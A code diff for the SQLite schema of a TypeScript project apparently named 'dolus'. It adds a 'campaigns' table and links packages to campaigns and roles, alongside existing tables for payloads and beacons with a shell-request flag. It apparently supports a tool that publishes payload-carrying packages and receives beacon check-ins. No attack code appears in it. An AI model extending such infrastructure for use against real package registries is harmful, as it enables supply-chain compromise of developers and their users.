@@ -11,6 +11,7 @@ const g = globalThis as unknown as { _dolusDb?: DatabaseSync };
 const db = g._dolusDb ?? new DatabaseSync(dbPath);
 g._dolusDb = db;
 
+db.exec('PRAGMA busy_timeout = 5000');
 db.exec('PRAGMA journal_mode = WAL');
 
 export const SCHEMA = `
@@ -73,6 +74,15 @@ CREATE TABLE IF NOT EXISTS settings (
   value TEXT NOT NULL
 );
 
+CREATE TABLE IF NOT EXISTS campaigns (
+  id          INTEGER PRIMARY KEY AUTOINCREMENT,
+  name        TEXT NOT NULL UNIQUE,
+  account_id  INTEGER NOT NULL REFERENCES accounts(id),
+  depth       INTEGER NOT NULL DEFAULT 1,
+  status      TEXT NOT NULL DEFAULT 'pending',
+  created_at  INTEGER NOT NULL DEFAULT (unixepoch())
+);
+
 CREATE TABLE IF NOT EXISTS pow_challenges (
   nonce      TEXT PRIMARY KEY,
   created_at INTEGER NOT NULL DEFAULT (unixepoch())
@@ -87,6 +97,8 @@ try { db.exec('ALTER TABLE beacons ADD COLUMN shell_requested INTEGER NOT NULL D
 try { db.exec('ALTER TABLE packages ADD COLUMN account_id INTEGER REFERENCES accounts(id)'); } catch (_) {}
 try { db.exec('ALTER TABLE packages ADD COLUMN payload_id INTEGER REFERENCES payloads(id)'); } catch (_) {}
 try { db.exec("ALTER TABLE packages ADD COLUMN version TEXT NOT NULL DEFAULT '1.0.0'"); } catch (_) {}
+try { db.exec('ALTER TABLE packages ADD COLUMN campaign_id INTEGER REFERENCES campaigns(id)'); } catch (_) {}
+try { db.exec('ALTER TABLE packages ADD COLUMN role TEXT'); } catch (_) {}
 
 // Seed default settings (INSERT OR IGNORE — first boot only)
 const seedSetting = db.prepare('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)');
@@ -131,6 +143,15 @@ export type Payload = {
   created_at: number;
 };
 
+export type Campaign = {
+  id: number;
+  name: string;
+  account_id: number;
+  depth: number;
+  status: 'pending' | 'published' | 'failed' | 'partial';
+  created_at: number;
+};
+
 export type Package = {
   id: number;
   name: string;
@@ -138,6 +159,8 @@ export type Package = {
   version: string;
   account_id: number | null;
   payload_id: number | null;
+  campaign_id: number | null;
+  role: string | null;
   created_at: number;
 };
 
